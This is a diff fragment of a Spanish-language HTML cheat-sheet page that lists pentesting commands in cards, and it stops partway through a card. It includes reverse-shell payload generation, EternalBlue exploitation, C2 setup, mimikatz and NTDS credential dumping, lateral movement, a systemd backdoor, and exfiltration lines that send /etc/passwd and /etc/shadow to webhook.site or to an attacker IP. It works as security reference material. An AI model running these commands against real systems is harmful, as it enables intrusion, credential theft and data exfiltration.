+                            <div class="cmd-row"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell64.exe -e x86/xor</code><span class="cmd-desc">Payload con evasión</span></div>
+                            <div class="cmd-row"><code>searchsploit apache 2.4.49</code><span class="cmd-desc">Buscar exploit local</span></div>
+                            <div class="cmd-row"><code>hydra -l admin -P pass.txt ssh://IP</code><span class="cmd-desc">Fuerza bruta SSH</span></div>
+                            <div class="cmd-row"><code>sqlmap -u "url?id=1" --dbs --batch</code><span class="cmd-desc">Automatizar SQLi</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="600">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-database" style="color: var(--secondary); margin-right:8px;"></i> Metasploit</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>msfconsole</code><span class="cmd-desc">Iniciar framework</span></div>
+                            <div class="cmd-row"><code>search eternalblue</code><span class="cmd-desc">Buscar exploits</span></div>
+                            <div class="cmd-row"><code>use exploit/windows/smb/ms17_010</code><span class="cmd-desc">Seleccionar exploit</span></div>
+                            <div class="cmd-row"><code>set RHOSTS 192.168.1.100</code><span class="cmd-desc">IP objetivo</span></div>
+                            <div class="cmd-row"><code>set LHOST 192.168.1.50</code><span class="cmd-desc">IP del atacante</span></div>
+                            <div class="cmd-row"><code>set LPORT 4444</code><span class="cmd-desc">Puerto de escucha</span></div>
+                            <div class="cmd-row"><code>set PAYLOAD windows/meterpreter/reverse_tcp</code><span class="cmd-desc">Payload</span></div>
+                            <div class="cmd-row"><code>show options</code><span class="cmd-desc">Ver opciones</span></div>
+                            <div class="cmd-row"><code>exploit -j -z</code><span class="cmd-desc">Ejecutar en background</span></div>
+                            <div class="cmd-row"><code>sessions -l</code><span class="cmd-desc">Listar sesiones</span></div>
+                            <div class="cmd-row"><code>sessions -i 1</code><span class="cmd-desc">Entrar a una sesión</span></div>
+                            <div class="cmd-row"><code>db_nmap -sV objetivo</code><span class="cmd-desc">Escaneo integrado</span></div>
+                            <div class="cmd-row"><code>getsystem</code><span class="cmd-desc">Escalar a SYSTEM (meterpreter)</span></div>
+                            <div class="cmd-row"><code>hashdump</code><span class="cmd-desc">Volcar hashes de Windows</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="650">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-broadcast-tower" style="color: #e040fb; margin-right:8px;"></i> C2 Frameworks</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>sliver</code><span class="cmd-desc">Framework C2 (implant)</span></div>
+                            <div class="cmd-row"><code>sliver generate --mtls IP --os windows --arch amd64</code><span class="cmd-desc">Generar implant</span></div>
+                            <div class="cmd-row"><code>sliver https --lhost IP --lport 443</code><span class="cmd-desc">Listener HTTPS</span></div>
+                            <div class="cmd-row"><code>./cobaltstrike.sh</code><span class="cmd-desc">Iniciar Cobalt Strike</span></div>
+                            <div class="cmd-row"><code>./teamserver IP password</code><span class="cmd-desc">Teamserver (requiere Java)</span></div>
+                            <div class="cmd-row"><code>powershell-empire server</code><span class="cmd-desc">Iniciar Empire C2</span></div>
+                            <div class="cmd-row"><code>powershell-empire client</code><span class="cmd-desc">Conectar cliente Empire</span></div>
+                            <div class="cmd-row"><code>havoc client</code><span class="cmd-desc">Havoc C2 (GUI)</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="700">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-arrow-up" style="color: #ffc107; margin-right:8px;"></i> Escalada de Privilegios</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>id; groups</code><span class="cmd-desc">Usuario y grupos</span></div>
+                            <div class="cmd-row"><code>sudo -l</code><span class="cmd-desc">Comandos sudo permitidos</span></div>
+                            <div class="cmd-row"><code>find / -perm /4000 -type f 2&gt;/dev/null</code><span class="cmd-desc">Binarios SUID</span></div>
+                            <div class="cmd-row"><code>getcap -r / 2&gt;/dev/null</code><span class="cmd-desc">Capabilities</span></div>
+                            <div class="cmd-row"><code>cat /etc/crontab; ls -la /etc/cron*</code><span class="cmd-desc">Tareas programadas</span></div>
+                            <div class="cmd-row"><code>crontab -l</code><span class="cmd-desc">Crons del usuario</span></div>
+                            <div class="cmd-row"><code>find / -writable -type d 2&gt;/dev/null | grep -v proc</code><span class="cmd-desc">Carpetas escribibles</span></div>
+                            <div class="cmd-row"><code>uname -a</code><span class="cmd-desc">Versión del kernel</span></div>
+                            <div class="cmd-row"><code>ls -la /tmp; ls -la /var/tmp</code><span class="cmd-desc">Archivos temporales</span></div>
+                            <div class="cmd-row"><code>history</code><span class="cmd-desc">Historial de comandos</span></div>
+                            <div class="cmd-row"><code>pspy</code><span class="cmd-desc">Espiar procesos y crons</span></div>
+                            <div class="cmd-row"><code>sudo find / -exec /bin/sh \;</code><span class="cmd-desc">Escalar vía sudo + find (GTFOBins)</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="750">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-key" style="color: #e040fb; margin-right:8px;"></i> Cracking de Contraseñas</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>hashcat -m 0 hashes.txt wordlist.txt</code><span class="cmd-desc">Crackear MD5</span></div>
+                            <div class="cmd-row"><code>hashcat -m 1000 hashes.txt wordlist.txt</code><span class="cmd-desc">Crackear NTLM</span></div>
+                            <div class="cmd-row"><code>hashcat -m 13100 hashes.txt wordlist.txt</code><span class="cmd-desc">Crackear Kerberoast</span></div>
+                            <div class="cmd-row"><code>hashcat -m 22000 hash.hc22000 wordlist.txt</code><span class="cmd-desc">Crackear WPA2</span></div>
+                            <div class="cmd-row"><code>hashcat --show hashes.txt</code><span class="cmd-desc">Mostrar crackeados</span></div>
+                            <div class="cmd-row"><code>john --format=raw-md5 hashes.txt</code><span class="cmd-desc">John the Ripper</span></div>
+                            <div class="cmd-row"><code>john --wordlist=wordlist.txt --rules=all hashes.txt</code><span class="cmd-desc">John con reglas</span></div>
+                            <div class="cmd-row"><code>john hashes.txt --show</code><span class="cmd-desc">Ver crackeados</span></div>
+                            <div class="cmd-row"><code>hydra -L users.txt -P pass.txt ftp://IP</code><span class="cmd-desc">Fuerza bruta FTP</span></div>
+                            <div class="cmd-row"><code>hydra -l admin -P pass.txt ssh://IP</code><span class="cmd-desc">Fuerza bruta SSH</span></div>
+                            <div class="cmd-row"><code>hydra -t 4 -l admin -P pass.txt http-post-form "url:user=^USER^&amp;pass=^PASS^:login_fail"</code><span class="cmd-desc">Fuerza bruta web</span></div>
+                            <div class="cmd-row"><code>medusa -h IP -U users.txt -P pass.txt -M ssh</code><span class="cmd-desc">Medusa</span></div>
+                            <div class="cmd-row"><code>crunch 8 8 abc123 -o lista.txt</code><span class="cmd-desc">Generar wordlist</span></div>
+                            <div class="cmd-row"><code>cewl https://sitio.com -w lista.txt</code><span class="cmd-desc">Wordlist desde la web</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="800">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-key" style="color: var(--secondary); margin-right:8px;"></i> Extracción de Hashes</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>zip2john archivo.zip &gt; hash.txt</code><span class="cmd-desc">Hash de ZIP</span></div>
+                            <div class="cmd-row"><code>7z2john archivo.7z &gt; hash.txt</code><span class="cmd-desc">Hash de 7z</span></div>
+                            <div class="cmd-row"><code>rar2john archivo.rar &gt; hash.txt</code><span class="cmd-desc">Hash de RAR</span></div>
+                            <div class="cmd-row"><code>office2john doc.docx &gt; hash.txt</code><span class="cmd-desc">Hash de Office</span></div>
+                            <div class="cmd-row"><code>pdf2john documento.pdf &gt; hash.txt</code><span class="cmd-desc">Hash de PDF</span></div>
+                            <div class="cmd-row"><code>keepass2john base.kdbx &gt; hash.txt</code><span class="cmd-desc">Hash de KeePass</span></div>
+                            <div class="cmd-row"><code>bitlocker2john -o hash.txt enc.vhd</code><span class="cmd-desc">Hash de BitLocker</span></div>
+                            <div class="cmd-row"><code>ssh2john id_rsa &gt; hash.txt</code><span class="cmd-desc">Hash de clave SSH</span></div>
+                            <div class="cmd-row"><code>john hash.txt --show</code><span class="cmd-desc">Mostrar crackeados</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="850">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-users-cog" style="color: #ffc107; margin-right:8px;"></i> Active Directory</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>crackmapexec smb IP -u users.txt -p 'password' --shares</code><span class="cmd-desc">Enumerar SMB</span></div>
+                            <div class="cmd-row"><code>crackmapexec smb IP -u admin -p 'pass' --pass-pol</code><span class="cmd-desc">Política de contraseñas</span></div>
+                            <div class="cmd-row"><code>impacket-GetNPUsers dominio.com/ -usersfile users.txt -dc-ip IP</code><span class="cmd-desc">AS-REP roast</span></div>
+                            <div class="cmd-row"><code>impacket-GetUserSPNs dominio.com/usuario:pass -dc-ip IP -request</code><span class="cmd-desc">Kerberoast</span></div>
+                            <div class="cmd-row"><code>impacket-secretsdump dominio.com/usuario:pass@IP</code><span class="cmd-desc">Volcar hashes (NTDS)</span></div>
+                            <div class="cmd-row"><code>impacket-mssqlclient dominio.com/usuario:pass@IP -windows-auth</code><span class="cmd-desc">SQL Server</span></div>
+                            <div class="cmd-row"><code>impacket-psexec dominio.com/usuario:pass@IP</code><span class="cmd-desc">Ejecutar como admin</span></div>
+                            <div class="cmd-row"><code>evil-winrm -i IP -u usuario -p pass</code><span class="cmd-desc">Shell remota WinRM</span></div>
+                            <div class="cmd-row"><code>bloodhound-python -u usuario -p pass -d dominio.com -ns IP -c All</code><span class="cmd-desc">Recolectar para BloodHound</span></div>
+                            <div class="cmd-row"><code>kerbrute userenum --dc IP -d dominio.com usuarios.txt</code><span class="cmd-desc">Enumerar usuarios</span></div>
+                            <div class="cmd-row"><code>responder -I eth0 -dwP</code><span class="cmd-desc">Capturar hashes en la red</span></div>
+                            <div class="cmd-row"><code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</code><span class="cmd-desc">Extraer credenciales</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="900">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-sitemap" style="color: #ffc107; margin-right:8px;"></i> Movilidad Lateral (Windows)</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>impacket-psexec user:pass@IP</code><span class="cmd-desc">Ejecución remota (admin)</span></div>
+                            <div class="cmd-row"><code>impacket-wmiexec user:pass@IP</code><span class="cmd-desc">Ejecución vía WMI</span></div>
+                            <div class="cmd-row"><code>impacket-smbexec user:pass@IP</code><span class="cmd-desc">Ejecución vía SMB</span></div>
+                            <div class="cmd-row"><code>impacket-secretsdump user:pass@IP</code><span class="cmd-desc">Dump de credenciales</span></div>
+                            <div class="cmd-row"><code>crackmapexec smb IP -u user -p pass -x "whoami"</code><span class="cmd-desc">Ejecutar comando remoto</span></div>
+                            <div class="cmd-row"><code>crackmapexec smb IP -u user -p pass --sam</code><span class="cmd-desc">Dump SAM</span></div>
+                            <div class="cmd-row"><code>netsh interface portproxy add v4tov4 listenport=445 connectaddress=IP connectport=445</code><span class="cmd-desc">Portproxy</span></div>
+                            <div class="cmd-row"><code>schtasks /create /tn "tarea" /tr "cmd /c whoami" /sc onlogon</code><span class="cmd-desc">Tarea programada</span></div>
+                            <div class="cmd-row"><code>sc \\IP create servicio binPath= "cmd /c start cmd.exe"</code><span class="cmd-desc">Crear servicio</span></div>
+                            <div class="cmd-row"><code>wmic process list brief</code><span class="cmd-desc">Procesos remotos</span></div>
+                            <div class="cmd-row"><code>xfreerdp /v:IP /u:usuario /p:pass /dynamic-resolution</code><span class="cmd-desc">Escritorio remoto</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="950">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-exchange-alt" style="color: #26a69a; margin-right:8px;"></i> Pivoting y Túneles</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>ssh -fN -L 8080:objetivo:80 usuario@host</code><span class="cmd-desc">Túnel local (background)</span></div>
+                            <div class="cmd-row"><code>ssh -D 1080 usuario@host</code><span class="cmd-desc">Proxy SOCKS dinámico</span></div>
+                            <div class="cmd-row"><code>ssh -R 4444:localhost:22 usuario@host</code><span class="cmd-desc">Túnel remoto</span></div>
+                            <div class="cmd-row"><code>proxychains nmap -sT -Pn objetivo</code><span class="cmd-desc">Escanear vía proxy</span></div>
+                            <div class="cmd-row"><code>proxychains4 curl http://objetivo</code><span class="cmd-desc">HTTP vía proxy</span></div>
+                            <div class="cmd-row"><code>chisel server -p 8080 --reverse</code><span class="cmd-desc">Servidor chisel</span></div>
+                            <div class="cmd-row"><code>chisel client IP:8080 R:1080:socks</code><span class="cmd-desc">Túnel SOCKS chisel</span></div>
+                            <div class="cmd-row"><code>sshuttle -r usuario@host 10.0.0.0/16</code><span class="cmd-desc">VPN automática</span></div>
+                            <div class="cmd-row"><code>socat TCP-LISTEN:8888,fork TCP:objetivo:80</code><span class="cmd-desc">Redirigir puerto</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1000">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-robot" style="color: #e040fb; margin-right:8px;"></i> Post-Explotación</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>id; uname -a; cat /etc/os-release</code><span class="cmd-desc">Recon rápido del host</span></div>
+                            <div class="cmd-row"><code>hostname; ip a</code><span class="cmd-desc">Identidad y red</span></div>
+                            <div class="cmd-row"><code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><span class="cmd-desc">LinPEAS</span></div>
+                            <div class="cmd-row"><code>python3 -m http.server 80</code><span class="cmd-desc">Servir archivos (atacante)</span></div>
+                            <div class="cmd-row"><code>curl -O http://IP/archivo</code><span class="cmd-desc">Descargar herramienta</span></div>
+                            <div class="cmd-row"><code>wget http://IP/archivo</code><span class="cmd-desc">Descarga alternativa</span></div>
+                            <div class="cmd-row"><code>pspy</code><span class="cmd-desc">Espiar procesos y crons</span></div>
+                            <div class="cmd-row"><code>pwncat -lp 4444</code><span class="cmd-desc">Listener avanzado interactivo</span></div>
+                            <div class="cmd-row"><code>history</code><span class="cmd-desc">Historial del usuario</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1050">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-clock" style="color: #26a69a; margin-right:8px;"></i> Persistencia y Sesiones</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>nohup comando &amp;</code><span class="cmd-desc">Ejecutar ignorando el cierre</span></div>
+                            <div class="cmd-row"><code>setsid comando</code><span class="cmd-desc">Nueva sesión sin terminal</span></div>
+                            <div class="cmd-row"><code>tmux new -s sesion</code><span class="cmd-desc">Sesión persistente</span></div>
+                            <div class="cmd-row"><code>tmux attach -t sesion</code><span class="cmd-desc">Reconectar</span></div>
+                            <div class="cmd-row"><code>tmux list-sessions</code><span class="cmd-desc">Listar sesiones</span></div>
+                            <div class="cmd-row"><code>screen -S sesion</code><span class="cmd-desc">Alternativa a tmux</span></div>
+                            <div class="cmd-row"><code>crontab -e</code><span class="cmd-desc">Tareas programadas</span></div>
+                            <div class="cmd-row"><code>at now + 1 minute</code><span class="cmd-desc">Ejecutar una vez</span></div>
+                            <div class="cmd-row"><code>echo "alias ll='ls -la'" &gt;&gt; ~/.bashrc</code><span class="cmd-desc">Aliases persistentes</span></div>
+                            <div class="cmd-row"><code>ssh-copy-id usuario@host</code><span class="cmd-desc">Clave persistente</span></div>
+                            <div class="cmd-row"><code>systemctl link /etc/systemd/system/backdoor.service</code><span class="cmd-desc">Unidad systemd</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1100">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-paper-plane" style="color: #ff6d00; margin-right:8px;"></i> Exfiltración de Datos</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>base64 archivo &gt; b64.txt</code><span class="cmd-desc">Codificar para exfiltrar</span></div>
+                            <div class="cmd-row"><code>cat b64.txt | base64 -d &gt; archivo</code><span class="cmd-desc">Decodificar (atacante)</span></div>
+                            <div class="cmd-row"><code>tar czf - /dir | nc IP 4444</code><span class="cmd-desc">Exfiltrar comprimido</span></div>
+                            <div class="cmd-row"><code>nc -lvnp 4444 &gt; captura.tar.gz</code><span class="cmd-desc">Recibir (atacante)</span></div>
+                            <div class="cmd-row"><code>curl -F "archivo=@/etc/passwd" https://webhook.site/url</code><span class="cmd-desc">Subir a webhook</span></div>
+                            <div class="cmd-row"><code>curl --data-binary @/etc/shadow http://IP:8080</code><span class="cmd-desc">Enviar vía POST</span></div>
+                            <div class="cmd-row"><code>python3 -m http.server 80</code><span class="cmd-desc">Descarga directa</span></div>
+                            <div class="cmd-row"><code>scp -r /dir usuario@IP:/tmp/</code><span class="cmd-desc">Exfiltrar vía SCP</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1150">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-user-secret" style="color: var(--secondary); margin-right:8px;"></i> Ingeniería Social</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>setoolkit</code><span class="cmd-desc">Social Engineering Toolkit</span></div>
+                            <div class="cmd-row"><code>gophish</code><span class="cmd-desc">Campañas de phishing</span></div>
+                            <div class="cmd-row"><code>beef-xss</code><span class="cmd-desc">Explotar navegadores</span></div>
+                            <div class="cmd-row"><code>evilginx2</code><span class="cmd-desc">Phishing con 2FA (reverse proxy)</span></div>
+                            <div class="cmd-row"><code>theHarvester -d ejemplo.com -b google</code><span class="cmd-desc">Recolectar emails</span></div>
+                            <div class="cmd-row"><code>grep -E "Received|X-Originating" correo.eml</code><span class="cmd-desc">Cabeceras de email</span></div>
+                            <div class="cmd-row"><code>exiftool archivo.jpg</code><span class="cmd-desc">Metadatos y geolocalización</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1200">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-file-invoice" style="color: #ffc107; margin-right:8px;"></i> Forense Digital</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>dd if=/dev/sdb of=disco.img bs=4M conv=noerror,sync</code><span class="cmd-desc">Imagen forense de disco</span></div>
+                            <div class="cmd-row"><code>sha256sum disco.img</code><span class="cmd-desc">Hash de integridad</span></div>
+                            <div class="cmd-row"><code>mount -o ro,loop disco.img /mnt/img</code><span class="cmd-desc">Montar imagen de solo lectura</span></div>
+                            <div class="cmd-row"><code>fls -r disco.img</code><span class="cmd-desc">Listar archivos (Sleuth Kit)</span></div>
+                            <div class="cmd-row"><code>foremost -i disco.img -o out/</code><span class="cmd-desc">Recuperar archivos</span></div>
+                            <div class="cmd-row"><code>exiftool foto.jpg</code><span class="cmd-desc">Metadatos EXIF</span></div>
+                            <div class="cmd-row"><code>strings archivo | grep -i password</code><span class="cmd-desc">Buscar texto en binario</span></div>
+                            <div class="cmd-row"><code>binwalk firmware.bin</code><span class="cmd-desc">Analizar firmware</span></div>
+                            <div class="cmd-row"><code>volatility -f memoria.mem imageinfo</code><span class="cmd-desc">Perfil de memoria</span></div>
+                            <div class="cmd-row"><code>volatility -f memoria.mem --profile=Win10x64 pslist</code><span class="cmd-desc">Procesos de la RAM</span></div>
+                            <div class="cmd-row"><code>bulk_extractor -o out/ disco.img</code><span class="cmd-desc">Extraer datos en masa</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1250">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-microchip" style="color: #e040fb; margin-right:8px;"></i> Ingeniería Inversa</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>file binario</code><span class="cmd-desc">Tipo de archivo</span></div>
+                            <div class="cmd-row"><code>strings -n 8 binario | grep -i flag</code><span class="cmd-desc">Cadenas legibles</span></div>
+                            <div class="cmd-row"><code>checksec --file=binario</code><span class="cmd-desc">Protecciones (RELRO, NX, PIE)</span></div>
+                            <div class="cmd-row"><code>objdump -d binario</code><span class="cmd-desc">Desensamblar</span></div>
+                            <div class="cmd-row"><code>readelf -h binario</code><span class="cmd-desc">Cabeceras ELF</span></div>
+                            <div class="cmd-row"><code>gdb ./binario</code><span class="cmd-desc">Debugger</span></div>
+                            <div class="cmd-row"><code>gdb -batch -ex "run" -ex "bt" ./binario</code><span class="cmd-desc">Ejecutar y backtrace</span></div>
+                            <div class="cmd-row"><code>strace -p PID</code><span class="cmd-desc">Trazar syscalls</span></div>
+                            <div class="cmd-row"><code>ltrace ./binario</code><span class="cmd-desc">Trazar llamadas libc</span></div>
+                            <div class="cmd-row"><code>rabin2 -I binario</code><span class="cmd-desc">Info del binario</span></div>
+                            <div class="cmd-row"><code>radare2 -A ./binario</code><span class="cmd-desc">Análisis con r2</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1300">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-fingerprint" style="color: var(--secondary); margin-right:8px;"></i> Hashing e Integridad</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>md5sum archivo</code><span class="cmd-desc">Hash MD5</span></div>
+                            <div class="cmd-row"><code>sha1sum archivo</code><span class="cmd-desc">Hash SHA-1</span></div>
+                            <div class="cmd-row"><code>sha256sum archivo</code><span class="cmd-desc">Hash SHA-256</span></div>
+                            <div class="cmd-row"><code>b2sum archivo</code><span class="cmd-desc">Hash BLAKE2</span></div>
+                            <div class="cmd-row"><code>openssl dgst -sha256 archivo</code><span class="cmd-desc">Hash con OpenSSL</span></div>
+                            <div class="cmd-row"><code>openssl dgst -sha256 -verify key.pub -signature file.sig data</code><span class="cmd-desc">Verificar firma</span></div>
+                            <div class="cmd-row"><code>openssl passwd -6 "password"</code><span class="cmd-desc">Hash de contraseña SHA-512</span></div>
+                            <div class="cmd-row"><code>openssl rand -base64 32</code><span class="cmd-desc">Contraseña aleatoria segura</span></div>
+                            <div class="cmd-row"><code>cmp -b archivo1 archivo2</code><span class="cmd-desc">Comparar archivos</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1350">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-lock" style="color: var(--primary); margin-right:8px;"></i> Criptografía y TLS</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>openssl rand -base64 32</code><span class="cmd-desc">Clave/contraseña aleatoria</span></div>
+                            <div class="cmd-row"><code>openssl enc -aes-256-cbc -salt -in f.txt -out f.enc</code><span class="cmd-desc">Cifrar con AES</span></div>
+                            <div class="cmd-row"><code>openssl enc -d -aes-256-cbc -in f.enc -out f.txt</code><span class="cmd-desc">Descifrar AES</span></div>
+                            <div class="cmd-row"><code>openssl genrsa -out key.pem 4096</code><span class="cmd-desc">Generar clave RSA</span></div>
+                            <div class="cmd-row"><code>openssl req -new -x509 -key key.pem -out cert.pem -days 365</code><span class="cmd-desc">Certificado autofirmado</span></div>
+                            <div class="cmd-row"><code>openssl x509 -text -in cert.pem</code><span class="cmd-desc">Ver detalles del certificado</span></div>
+                            <div class="cmd-row"><code>openssl s_client -connect host:443 -servername host</code><span class="cmd-desc">Probar TLS (SNI)</span></div>
+                            <div class="cmd-row"><code>openssl s_client -connect host:443 -showcerts</code><span class="cmd-desc">Ver cadena de certificados</span></div>
+                            <div class="cmd-row"><code>openssl speed aes-256-cbc</code><span class="cmd-desc">Benchmark de cifrado</span></div>
+                            <div class="cmd-row"><code>ssh-keygen -t ed25519</code><span class="cmd-desc">Generar clave SSH Ed25519</span></div>
+                            <div class="cmd-row"><code>certbot --nginx -d dominio.com</code><span class="cmd-desc">Let's Encrypt</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1400">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-envelope" style="color: #26a69a; margin-right:8px;"></i> GPG y Firma Digital</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>gpg --full-generate-key</code><span class="cmd-desc">Crear par de claves</span></div>
+                            <div class="cmd-row"><code>gpg --list-keys</code><span class="cmd-desc">Listar claves públicas</span></div>
+                            <div class="cmd-row"><code>gpg --export --armor email@ejemplo.com</code><span class="cmd-desc">Exportar clave pública</span></div>
+                            <div class="cmd-row"><code>gpg --export-secret-keys --armor</code><span class="cmd-desc">Backup de clave privada</span></div>
+                            <div class="cmd-row"><code>gpg --import clave.asc</code><span class="cmd-desc">Importar clave</span></div>
+                            <div class="cmd-row"><code>gpg -c archivo.txt</code><span class="cmd-desc">Cifrado simétrico</span></div>
+                            <div class="cmd-row"><code>gpg -e -r email@ejemplo.com archivo</code><span class="cmd-desc">Cifrar para un destinatario</span></div>
+                            <div class="cmd-row"><code>gpg -d archivo.gpg</code><span class="cmd-desc">Descifrar</span></div>
+                            <div class="cmd-row"><code>gpg --sign archivo</code><span class="cmd-desc">Firmar</span></div>
+                            <div class="cmd-row"><code>gpg --verify archivo.sig</code><span class="cmd-desc">Verificar firma</span></div>
+                            <div class="cmd-row"><code>gpg --edit-key email@ejemplo.com</code><span class="cmd-desc">Revocar / agregar UID</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1450">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-terminal" style="color: var(--primary); margin-right:8px;"></i> Linux - Básicos y Texto</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>ls -la</code><span class="cmd-desc">Listar ocultos y permisos</span></div>
+                            <div class="cmd-row"><code>find /etc -name "*.conf"</code><span class="cmd-desc">Buscar por nombre</span></div>
+                            <div class="cmd-row"><code>grep -r "password" /etc/</code><span class="cmd-desc">Buscar recursivo</span></div>
+                            <div class="cmd-row"><code>head -n 20 access.log</code><span class="cmd-desc">Primeras 20 líneas</span></div>
+                            <div class="cmd-row"><code>tail -f /var/log/auth.log</code><span class="cmd-desc">Ver log en vivo</span></div>
+                            <div class="cmd-row"><code>awk '{print $1}' access.log | sort | uniq -c | sort -rn</code><span class="cmd-desc">Top IPs</span></div>
+                            <div class="cmd-row"><code>sed 's/old/new/g' archivo.txt</code><span class="cmd-desc">Reemplazar texto</span></div>
+                            <div class="cmd-row"><code>cut -d: -f1 /etc/passwd</code><span class="cmd-desc">Primer campo</span></div>
+                            <div class="cmd-row"><code>sort -rn datos.txt | head</code><span class="cmd-desc">Ordenar y mostrar top</span></div>
+                            <div class="cmd-row"><code>wc -l access.log</code><span class="cmd-desc">Contar líneas</span></div>
+                            <div class="cmd-row"><code>xargs -n1 &lt; lista.txt</code><span class="cmd-desc">Ejecutar por línea</span></div>
+                            <div class="cmd-row"><code>diff -u archivo1 archivo2</code><span class="cmd-desc">Diferencias</span></div>
+                            <div class="cmd-row"><code>which nmap</code><span class="cmd-desc">Ruta del binario</span></div>
+                            <div class="cmd-row"><code>wget https://url/archivo</code><span class="cmd-desc">Descargar archivo</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1500">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-terminal" style="color: var(--accent); margin-right:8px;"></i> Linux - Auditoría</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>id; groups</code><span class="cmd-desc">Usuario y grupos</span></div>
+                            <div class="cmd-row"><code>cat /etc/passwd | cut -d: -f1</code><span class="cmd-desc">Usuarios del sistema</span></div>
+                            <div class="cmd-row"><code>getent shadow | grep -E ':[^!*]'</code><span class="cmd-desc">Usuarios con contraseña</span></div>
+                            <div class="cmd-row"><code>sudo -l</code><span class="cmd-desc">Comandos sudo permitidos</span></div>
+                            <div class="cmd-row"><code>find / -perm /4000 -type f 2&gt;/dev/null</code><span class="cmd-desc">Archivos SUID</span></div>
+                            <div class="cmd-row"><code>find / -writable -type d 2&gt;/dev/null | head -20</code><span class="cmd-desc">Directorios escribibles</span></div>
+                            <div class="cmd-row"><code>ss -tulpn</code><span class="cmd-desc">Puertos y sockets activos</span></div>
+                            <div class="cmd-row"><code>sudo netstat -tulpn</code><span class="cmd-desc">Puertos abiertos</span></div>
+                            <div class="cmd-row"><code>ls -la /var/log</code><span class="cmd-desc">Logs del sistema</span></div>
+                            <div class="cmd-row"><code>find / -type f -name "*.conf" 2&gt;/dev/null</code><span class="cmd-desc">Configs sensibles</span></div>
+                            <div class="cmd-row"><code>uname -a</code><span class="cmd-desc">Kernel y arquitectura</span></div>
+                            <div class="cmd-row"><code>cat /etc/os-release</code><span class="cmd-desc">Distribución y versión</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1550">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-server" style="color: #00c853; margin-right:8px;"></i> Linux - Procesos y Rendimiento</div>
